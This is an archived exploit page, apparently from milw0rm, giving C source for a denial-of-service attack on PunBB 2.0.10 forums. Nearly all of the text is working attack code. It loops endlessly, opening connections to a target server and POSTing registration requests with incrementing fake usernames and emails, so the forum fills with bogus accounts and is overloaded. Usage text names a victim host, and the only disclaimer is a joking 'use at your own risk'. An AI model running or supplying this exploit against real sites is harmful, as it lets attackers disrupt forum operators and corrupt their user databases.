<html><head><title>PunBB <= 2.0.10 (Register Multiple Users) Denial of Service Exploit</title></head><pre>/*
  Name: NST-Exploit Punbb 2.0.10 Denial Of Service
  Copyright: NeoSecurity
  Author: K4P0
    
  [./]NST-XplPunbb www.victim.com 2.0.0.6 /punbb/
  
  #################################################
  PunBB 2.0.10 Denial of Service exploit by K4P0  
  Use only at your own reputation risk! ;)        

  www.NeoSecurityTeam.net                         
  #################################################

  [1] - Trying if connection is possible...
  [2] - Connected!
  [3] - Flooding localhost...
  
  Use it at your own risk!.
*/

#define WINDOWS
//#define LINUX

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#ifdef WINDOWS
#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;
// Link to (lib)ws2_32.a
#else
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#endif

#define NST_ALIVE 1

int  Connect(char*);
void SendPack(int, int, char*, char*); 
void _perror(char*);
void HowTo(char*);

int main(int argc, char* argv[])
{
  int vict_sock, dos = 0;
  puts(&quot;#################################################&quot;);
  puts(&quot; PunBB 2.0.10 Denial of Service exploit by K4P0  &quot;);
  puts(&quot; Use only at your own reputation risk! ;)        \n&quot;);
  puts(&quot; www.NeoSecurityTeam.net                         &quot;);
  if(argc &lt; 4) HowTo(argv[0]);
  puts(&quot;#################################################\n&quot;);

  printf(&quot;[1] - Trying if connection is possible...\n&quot;, argv[1]);
  fflush(stdout);
  vict_sock = Connect(argv[2]);
  printf(&quot;[2] - Connected!\n&quot;);
  printf(&quot;[3] - Flooding %s&quot;, argv[1]);
  #ifdef WINDOWS
  closesocket(vict_sock);
  #else
  close(vict_sock);
  #endif
  
  while(NST_ALIVE)
  {
                         if(!(dos % 10)) fprintf(stderr, &quot;.&quot;);
                         vict_sock = Connect(argv[2]);
                         SendPack(vict_sock, dos, argv[3], argv[1]);
                         dos++;
                         #ifdef WINDOWS
                         closesocket(vict_sock);
                         WSACleanup();
                         #else
                         close(vict_sock);
                         #endif
  }
  return 0;
}
// I'm to lazy to use gethostby(addr|name) :)
int Connect(char* IP)
{
    struct sockaddr_in *_addr;
    int vict_sck;
    
    #ifdef WINDOWS
    WSADATA wsaData;
    if(WSAStartup(MAKEWORD(1, 1), &amp;wsaData) &lt; 0)
    {
                              //WSAGetLastError()? Nah...
                              fprintf(stderr, &quot;[*]   WSAStartup() failed&quot;);
                              exit(-1);
    }
    #endif
    
    if(!(_addr=(struct sockaddr_in *)malloc(sizeof(struct sockaddr_in))))
    {
                     fprintf(stderr, &quot;[*]   Unable to reserve memory&quot;);
                     exit(-1);
    }
      
    memset(_addr, 0x0, sizeof(struct sockaddr_in));
    _addr-&gt;sin_family = AF_INET;
    _addr-&gt;sin_port   = htons(80);
    _addr-&gt;sin_addr.s_addr = inet_addr(IP);
    
    #ifdef WINDOWS
    if((vict_sck = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) &lt; 0)
    {
                 fprintf(stderr, &quot;WSASocket() failed&quot;);
                 exit(-1);
    }
    else
    if((vict_sck = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) 
                 _perror(&quot;socket() &quot;);
    #endif
    
    if(connect(vict_sck, (struct sockaddr *)_addr, sizeof(struct sockaddr)) &lt; 0)
                 _perror(&quot;connect() &quot;); 
    
    free(_addr);
    return vict_sck; 
}

void SendPack(int v_sck, int var, char* path, char* DNS)
{
     char *HTTP_PACK, *HTTP_MPCK, *HTTP_POST;
     if(!(HTTP_PACK = (char *)malloc(2048)) || !(HTTP_MPCK = (char *)malloc(1024)) ||
        !(HTTP_POST = (char *)malloc(512)))
     {
                    fprintf(stderr, &quot;Error trying to reserver memory&quot;);
                    exit(-1);
     }
     sprintf(HTTP_PACK, &quot;POST %sregister.php?action=register HTTP/1.1\n&quot;
                        &quot;Host: %s\n&quot;
                        &quot;User-Agent: Mozilla/5.0 Gecko/20050511 Firefox/1.0.4\n&quot;
                        &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n&quot;
                        &quot;Accept-Language: es-ar,es;q=0.8,en-us;q=0.5,en;q=0.3\n&quot;
                        &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n&quot;
                        &quot;Keep-Alive: 300\n&quot;
                        &quot;Proxy-Connection: keep-alive\n&quot;
                        &quot;Referer: http://%s%sregister.php\n&quot;
                        &quot;Content-Type: application/x-www-form-urlencoded\n&quot;, path, DNS, DNS, path);
                                                                            
     sprintf(HTTP_POST, &quot;form_sent=1&amp;req_username=%d__NsT&amp;req_password1=flood&amp;req_password2=flood&amp;&quot;
                        &quot;req_email1=%d_peace@NsT.net&amp;timezone=-10&amp;email_setting=1&quot;, var, var);
     
     sprintf(HTTP_MPCK, &quot;Content-Length: %d\n\n&quot;, strlen(HTTP_POST));
        
     strcat(HTTP_PACK, HTTP_MPCK);
     strcat(HTTP_PACK, HTTP_POST);
     send(v_sck, HTTP_PACK, strlen(HTTP_PACK), 0);
     
     free(HTTP_PACK);
     free(HTTP_MPCK);
     free(HTTP_POST);
     return;
}

void _perror(char* msg)
{
     perror(msg);
     fflush(stdout);
     exit(-1);
}

void HowTo(char* program)
{
     fprintf(stderr, &quot;%s &lt;DNS&gt; &lt;IP&gt; &lt;Path&gt;\n&quot;, program);
     fprintf(stderr, &quot;f.e: ./NsT-XplPunbb www.victim.com 2.0.0.6 /punbb/\n&quot;);
     fprintf(stderr, &quot;#################################################&quot;);
     exit(0);
}

// milw0rm.com [2006-02-20]</pre></html>